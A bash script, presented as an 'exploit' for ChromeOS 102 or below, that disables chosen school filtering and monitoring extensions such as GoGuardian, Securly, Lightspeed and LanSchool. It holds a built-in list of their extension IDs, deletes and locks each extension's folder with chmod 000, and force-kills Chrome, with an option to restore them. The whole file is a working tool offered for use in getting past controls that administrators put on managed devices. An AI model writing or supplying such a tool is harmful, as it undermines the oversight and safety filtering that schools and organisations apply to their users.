#!/bin/bash

source <(tail -3 /etc/os-release)

if [ "$VERSION" -gt "102" ]; then
  echo "You must downgrade to ChromeOS 101 or below for this exploit to work.";
  exit;
else
  echo "Starting..";
  clear;
fi

function check_ext() {
  if [ "$EXTSELECT" = "1" ]; then
    extension="Lightspeed Filter Agent";
    extid="adkcpkpghahmbopkjchobieckeoaoeem";
  fi
  if [ "$EXTSELECT" = "2" ]; then
    extension="Cookie Clicker for YouTube";
    extid="bjlelllmddmghonfckbpjafiamjhlkio";
  fi
  if [ "$EXTSELECT" = "3" ]; then
    extension="Blocksi Web Filter";
    extid="pgmjaihnmedpcdkjcgigocogcbffgkbn";
  fi
  if [ "$EXTSELECT" = "4" ]; then
    extension="Content Keeper Authenticator";
    extid="jdogphakondfdmcanpapfahkdomaicfa";
  fi
  if [ "$EXTSELECT" = "5" ]; then
    extension="iBoss";
    extid="kmffehbidlalibfeklaefnckpidbodff";
  fi
  if [ "$EXTSELECT" = "6" ]; then
    extension="LanSchool";
    extid="baleiojnjpgeojohhhfbichcodgljmnj";
  fi
  if [ "$EXTSELECT" = "7" ]; then
    extension="GoGuardian";
    extid="haldlgldplgnggkjaafhelgiaglafanh";
  fi
  if [ "$EXTSELECT" = "8" ]; then
    extension="Securly";
    extid="iheobagjkfklnlikgihanlhcddjoihkg";
  fi
  if [ "$EXTSELECT" = "9" ]; then
    extension="Securly Classroom";
    extid="jfbecfmiegcjddenjhlbhlikcbfmnafd";
  fi
}

echo "Please select your mode: "
echo "1. Select Blocker from List"
echo "2. Manually type ID"
read selmethod
if [ "$selmethod" = "1" ]; then
  clear;
  echo "Please select a blocker";
  echo "1. Lightspeed Filter Agent";
  echo "2. Cookie Clicker for YouTube";
  echo "3. Blocksi Web Filter";
  echo "4. Content Web Keeper";
  echo "5. iBoss";
  echo "6. LanSchool";
  echo "7. GoGuardian";
  echo "8. Securly";
  echo "9. Securly Classroom";
  echo "";
  echo "Type the number of your extension: (Ex. 3 = Blocksi)"
  read EXTSELECT;
  check_ext;
else
  clear
  echo "Please enter your extension ID";
  read EXTSELECTID;
  extid="$EXTSELECTID";
  extension="Using ID";
fi

clear
echo "Selected Extension: $extension"
echo "Selected Extension ID: $extid"
echo "------------------------------"
echo "1. Disable the selected extension"
echo "2. Enable the selected extension"
echo "3. Exit"
read extdisen
if [ "$extdisen" = "1" ]; then
  echo "Disabling.. Please wait.";
  mkdir ~/ext-ds-en/
  mkdir ~/ext-ds-en/Backups
  mkdir ~/ext-ds-en/Backups/"$extid"
  cp -r ~/Extensions/"$extid"/ ~/ext-ds-en/Backups/"$extid"/;
  rm -rf ~/Extensions/"$extid"
  mkdir ~/Extensions/"$extid"
  chmod 000 ~/Extensions/"$extid"
  echo "Done! Press enter to restart chrome." 
  read enterpleasedisable
  pkill -9 chrome
  cd /opt/google/chrome
fi
if [ "$extdisen" = "2" ]; then
  echo "Enabling.. Please wait.";
  mkdir ~/ext-ds-en/
  mkdir ~/ext-ds-en/Backups
  mkdir ~/ext-ds-en/Backups/"$extid"
  chmod 777 ~/Extensions/"$extid"
  rm -rf ~/Extensions/"$extid"
  cp -r ~/ext-ds-en/Backups/"$extid" ~/Extensions/"$extid"
  echo "Done! Press enter to restart chrome."
  read enterpleaseenable
  pkill -9 chrome
  cd /opt/google/chrome
fi
if [ "$extdisen" = "3" ]; then
  exit
fi
